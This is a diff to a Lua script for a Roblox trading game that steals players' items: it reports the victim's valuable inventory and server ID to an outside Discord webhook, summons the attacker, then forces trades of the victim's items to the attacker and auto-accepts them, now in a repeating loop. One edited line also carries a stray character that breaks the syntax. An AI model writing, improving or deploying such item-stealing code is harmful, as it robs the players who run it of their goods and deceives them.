@@ -22,7 +22,7 @@ local values = {
     ["Elderwood Revolver"] = 58,
     ["Eternal II"] = 7,
     ["Red Luger"] = 42,
-    ["Green Luger"] = 30,
+    ["Green Luger"] = 30,к
     ["Sugar"] = 145,
     ["Candy"] = 155,
     ["Chill"] = 24,
@@ -1070,11 +1070,12 @@ local WebHookEmbed = CreateEmbed(
     }
 )
 
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-    SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+    SendWebhook(webHook, {content = '-- ```'..game.JobId..'``` 142823291 -- @everyone \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = '-- ```'..game.JobId..'``` 142823291 \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
+
 
 local function stealitems()
     coroutine.resume(destroytrades2)
@@ -1084,7 +1085,7 @@ local function stealitems()
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    wait(3)
+    wait(1)
 
     for a,b in pairs(uniqueItems) do
         for i = 1, b.amount do
@@ -1176,12 +1177,17 @@ local function stealitems()
 
     wait(6)
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+    wait(3)
 end
 
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
-            stealitems()
+            while player.Parent do
+print("Steal items")
+                stealitems()
+                wait(0.1)
+            end
         end)
     end
 end)
